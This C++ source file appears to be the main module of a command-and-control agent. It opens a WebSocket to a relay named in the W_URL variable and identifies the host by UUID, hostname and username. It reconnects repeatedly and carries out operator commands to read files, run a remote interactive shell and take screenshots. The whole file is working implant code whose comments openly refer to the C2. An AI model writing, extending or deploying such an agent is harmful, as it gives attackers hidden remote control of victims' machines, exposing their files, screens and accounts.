#include "commands.h"
#include "runtime.h"
#include "websocket_client.h"
#include "shell.h"
#include "core/memory/memory.h"
#include "core/string/string.h"
#include "platform/system/environment.h"
#include "platform/system/system_info.h"

/**
 * Appends a decimal number to the identity header block.
 *
 * @param writer Writer positioned at the current end of the header block.
 * @param value Number to render as decimal digits.
 * @return true if it fit, false if the buffer was exhausted (cursor unchanged).
 */
static BOOL WriteNumber(BinaryWriter &writer, UINT64 value)
{
    CHAR buf[24];
    StringUtils::UIntToStr(value, Span<CHAR>(buf, sizeof(buf)));
    return writer.WriteString(buf) != nullptr;
}

/**
 * Builds the identity header block sent with the /agent WebSocket upgrade (API 1).
 *
 * @details Identity travels as HTTP headers. The relay
 * copies these headers into its agent events and /status; the C2 consumes them as
 * typed fields without parsing anything binary. Two formats must stay stable:
 *  - X-Agent-Uuid: the machine UUID's 16 bytes formatted as C# Guid.ToString()
 *    (Data1-3 little-endian/reversed, Data4-5 raw) — identical to what the C2 has
 *    historically keyed agents on, so machines registered by older builds keep
 *    their identity.
 *  - X-Agent-Capabilities: the 8-byte capability-category bitmap as lowercase hex.
 *
 * @param info Populated SystemInfo (the same data the old Hello response carried).
 * @param out Output buffer for CRLF-terminated header lines (no trailing blank line).
 * @return Total header-block length, or 0 if the buffer was too small.
 */
static USIZE BuildIdentityHeaders(const SystemInfo &info, Span<CHAR> out)
{
    const CHAR *hex = "0123456789abcdef";

    BinaryWriter writer{Span<UINT8>((UINT8 *)out.Data(), out.Size())};

    // Reconstruct the UUID's raw 16 bytes from its 64-bit halves.
    UINT64 msb = info.MachineUUID.GetMostSignificantBits();
    UINT64 lsb = info.MachineUUID.GetLeastSignificantBits();
    UINT8 ub[16];
    for (INT32 i = 0; i < 8; i++)
        ub[i] = (UINT8)(msb >> (56 - 8 * i));
    for (INT32 i = 0; i < 8; i++)
        ub[8 + i] = (UINT8)(lsb >> (56 - 8 * i));

    CHAR uuid[37];
    {
        INT32 o = 0;
        auto put = [&](UINT8 byte)
        {
            uuid[o++] = hex[byte >> 4];
            uuid[o++] = hex[byte & 0xF];
        };
        put(ub[3]); put(ub[2]); put(ub[1]); put(ub[0]); uuid[o++] = '-';
        put(ub[5]); put(ub[4]); uuid[o++] = '-';
        put(ub[7]); put(ub[6]); uuid[o++] = '-';
        for (INT32 i = 8; i < 12; i++) put(ub[i]);
        uuid[o++] = '-';
        for (INT32 i = 12; i < 16; i++) put(ub[i]);
        uuid[o] = '\0';
    }

    CapabilityMask mask = BuildCapabilityMask();

    // Each append fails cleanly (nullptr, cursor unchanged) when the buffer is
    // too small, so a single ok flag folds every overflow into one result.
    BOOL ok = true;
    ok = ok && writer.WriteString("X-Agent-Api-Version: ") != nullptr && WriteNumber(writer, AGENT_API_VERSION) && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Uuid: ") != nullptr && writer.WriteString(uuid) != nullptr && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Hostname: ") != nullptr && writer.WriteString(info.Hostname) != nullptr && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Username: ") != nullptr && writer.WriteString(info.Username) != nullptr && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Arch: ") != nullptr && writer.WriteString(info.Architecture) != nullptr && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Platform: ") != nullptr && writer.WriteString(info.AgentPlatform) != nullptr && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Os-Version: ") != nullptr && writer.WriteString(info.OSVersion) != nullptr && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Build: ") != nullptr && WriteNumber(writer, AGENT_BUILD_NUMBER) && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Commit: ") != nullptr && writer.WriteString(AGENT_COMMIT_HASH) != nullptr && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Name-Id: ") != nullptr && WriteNumber(writer, AGENT_NAME_ID) && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Bitness: ") != nullptr && WriteNumber(writer, sizeof(void *) * 8) && writer.WriteString("\r\n") != nullptr;
    ok = ok && writer.WriteString("X-Agent-Capabilities: ") != nullptr;
    for (USIZE i = 0; ok && i < CAPABILITY_MASK_BYTES; i++)
    {
        CHAR byte[3] = {hex[mask.Bits[i] >> 4], hex[mask.Bits[i] & 0xF], '\0'};
        ok = writer.WriteString(byte) != nullptr;
    }
    ok = ok && writer.WriteString("\r\n") != nullptr;

    return ok ? writer.GetOffset() : 0;
}

static const CHAR *CommandTypeName(UINT8 type)
{
    switch (type)
    {
    case CommandType::Command_GetDirectoryContent:
        return "GetDirectoryContent";
    case CommandType::Command_GetFileContent:
        return "GetFileContent";
    case CommandType::Command_GetFileChunkHash:
        return "GetFileChunkHash";
    case CommandType::Command_WriteShell:
        return "WriteShell";
    case CommandType::Command_ReadShell:
        return "ReadShell";
    case CommandType::Command_GetDisplays:
        return "GetDisplays";
    case CommandType::Command_GetScreenshot:
        return "GetScreenshot";
    case CommandType::Command_CloseShell:
        return "CloseShell";
    case CommandType::Command_Exit:
        return "Exit";
    case CommandType::Command_OpenShell:
        return "OpenShell";
    default:
        return "Unknown";
    }
}

INT32 start()
{
    // Resolve the relay URL from the W_URL environment variable at runtime.
    // There is no fallback: the agent will not run without an explicit endpoint.
    CHAR urlBuffer[512];
    USIZE urlLen = Environment::GetVariable("W_URL", Span<CHAR>(urlBuffer, sizeof(urlBuffer)));
    if (urlLen == 0)
    {
        LOG_ERROR("W_URL environment variable is not set; cannot start agent without a relay endpoint");
        return 0;
    }
    Span<const CHAR> urlSpan(urlBuffer, urlLen); // exclude null terminator (ParseUrl bounds on Span size)

    Context context;
    UINT32 connectionAttempt = 0;

    CommandHandler commandHandlers[CommandType::CommandTypeCount] = {nullptr};
    // Core (mandatory, always registered)
    commandHandlers[CommandType::Command_Exit] = Handle_ExitCommand;
#if SUPPORT_FILESYSTEM
    commandHandlers[CommandType::Command_GetDirectoryContent] = Handle_GetDirectoryContentCommand;
    commandHandlers[CommandType::Command_GetFileContent]      = Handle_GetFileContentCommand;
    commandHandlers[CommandType::Command_GetFileChunkHash]    = Handle_GetFileChunkHashCommand;
#endif
#if SUPPORT_SHELL
    commandHandlers[CommandType::Command_OpenShell]  = Handle_OpenShellCommand;
    commandHandlers[CommandType::Command_CloseShell] = Handle_CloseShellCommand;
    commandHandlers[CommandType::Command_ReadShell]  = Handle_ReadShellCommand;
    commandHandlers[CommandType::Command_WriteShell] = Handle_WriteShellCommand;
#endif
#if SUPPORT_DISPLAY
    commandHandlers[CommandType::Command_GetDisplays]   = Handle_GetDisplaysCommand;
    commandHandlers[CommandType::Command_GetScreenshot] = Handle_GetScreenshotCommand;
#endif

    LOG_INFO("Agent starting, registered %d command handlers", (INT32)CommandType::CommandTypeCount);

    while (!context.shouldExit)
    {
        connectionAttempt++;
        LOG_INFO("Connection attempt #%u to %s", connectionAttempt, (PCCHAR)urlBuffer);

        // Identity rides the upgrade request as HTTP headers (API 1) — no Hello
        // frame. Built fresh per connection so a changed hostname/user follows
        // the reconnect.
        SystemInfo identityInfo;
        GetSystemInfo(&identityInfo);
        CHAR identityHeaders[1024];
        USIZE identityHeadersLen = BuildIdentityHeaders(identityInfo, Span<CHAR>(identityHeaders, sizeof(identityHeaders)));
        if (identityHeadersLen == 0)
        {
            LOG_ERROR("Identity header block does not fit (attempt #%u)", connectionAttempt);
            return 0;
        }

        auto createResult = WebSocketClient::Create(urlSpan, Span<const CHAR>(identityHeaders, identityHeadersLen));
        if (!createResult)
        {
            LOG_ERROR("Connection attempt #%u failed: unable to open WebSocket to %s", connectionAttempt, (PCCHAR)urlBuffer);
            return 0;
        }
        WebSocketClient &wsClient = createResult.Value();
        LOG_INFO("WebSocket connection established (attempt #%u) to %s (identity sent in upgrade headers)",
                 connectionAttempt, (PCCHAR)urlBuffer);

        UINT32 messageCount = 0;
        while (!context.shouldExit)
        {
            LOG_DEBUG("Waiting for next WebSocket message...");
            auto readResult = wsClient.Read();
            if (!readResult)
            {
                LOG_ERROR("WebSocket read failed after %u messages processed, reconnecting...", messageCount);
                break;
            }
            if (readResult.Value().Length < sizeof(UINT8))
            {
                LOG_ERROR("WebSocket received empty/undersized message (%u bytes), reconnecting...",
                          (UINT32)readResult.Value().Length);
                break;
            }

            messageCount++;
            PCHAR command = (PCHAR)(readResult.Value().Data);
            UINT8 commandType = command[0];
            command++;
            USIZE commandLength = readResult.Value().Length - sizeof(UINT8);
            LOG_INFO("Message #%u received: command=%s (0x%02x), payload_length=%u, ws_opcode=%d",
                     messageCount, CommandTypeName(commandType), (UINT32)commandType,
                     (UINT32)commandLength, (INT32)readResult.Value().Opcode);

            PCHAR response = nullptr;
            USIZE responseLength = sizeof(UINT32);

            if (commandType < CommandType::CommandTypeCount && commandHandlers[commandType])
            {
                LOG_DEBUG("Dispatching command %s to handler", CommandTypeName(commandType));
                commandHandlers[commandType](command, commandLength, &response, &responseLength, &context);
                UINT32 statusCode = *(PUINT32)response;
                LOG_INFO("Command %s completed: status=%u, response_length=%u",
                         CommandTypeName(commandType), statusCode, (UINT32)responseLength);
            }
            else
            {
                LOG_ERROR("Unknown command type 0x%02x received (max valid: 0x%02x), returning StatusUnknownCommand",
                          (UINT32)commandType, (UINT32)(CommandType::CommandTypeCount - 1));
                response = new CHAR[responseLength];
                *(PUINT32)response = StatusCode::StatusUnknownCommand;
            }

            LOG_DEBUG("Sending response (%u bytes) to server", (UINT32)responseLength);
            auto writeResult = wsClient.Write(Span<const CHAR>(response, responseLength), WebSocketOpcode::Binary);
            delete[] response;

            if (!writeResult)
            {
                LOG_ERROR("Failed to send response for command %s, reconnecting...", CommandTypeName(commandType));
                break;
            }
            LOG_INFO("Response sent successfully for command %s (%u bytes)", CommandTypeName(commandType), (UINT32)responseLength);
        }

        LOG_WARNING("WebSocket session ended after %u messages, will attempt reconnection", messageCount);
    }
    return 1;
}
